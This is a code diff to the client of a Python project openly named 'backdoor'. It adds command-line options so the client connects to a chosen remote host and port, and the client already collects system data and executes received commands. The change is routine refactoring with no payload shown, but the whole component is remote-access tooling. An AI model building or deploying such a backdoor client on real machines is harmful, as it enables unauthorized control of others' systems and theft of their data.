@@ -1,3 +1,4 @@
+from argparse import ArgumentParser, Namespace
 import socket
 import time
 
@@ -13,6 +14,9 @@ from backdoor.report.systemreport import SystemDataCollector
 from backdoor.serialization.jsonserializer import JsonSerializer
 
 
+DEFAULT_PORT = 4567
+
+
 class Client:
 
     def __init__(
@@ -20,7 +24,7 @@ class Client:
         messenger: SocketMessenger,
         exchanger: ClientExchangeMapper,
         data_collector: SystemDataCollector,
-        host: str = "localhost",
+        host: str,
         port: int = 4567,
     ) -> None:
         self.host = host
@@ -55,7 +59,16 @@ class Client:
         self.server = ServerModel(host=self.host, port=self.port, sock=server)
 
 
+def parse_args() -> Namespace:
+    parser = ArgumentParser()
+    parser.add_argument("-a", "--host", required=True)
+    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
+    return parser.parse_args()
+
+
 def main() -> None:
+    args = parse_args()
+
     protocol = SocketProtocol()
     serializer = JsonSerializer()
     messenger = SocketMessenger(protocol, serializer)
@@ -65,7 +78,9 @@ def main() -> None:
     executor = CommandExecutor(file_processor)
     exchanger = ClientExchangeMapper(messenger, executor)
     data_collector = SystemDataCollector()
-    client = Client(messenger, exchanger, data_collector)
+    client = Client(
+        messenger, exchanger, data_collector, host=args.host, port=args.port
+    )
 
     try:
         client.run()
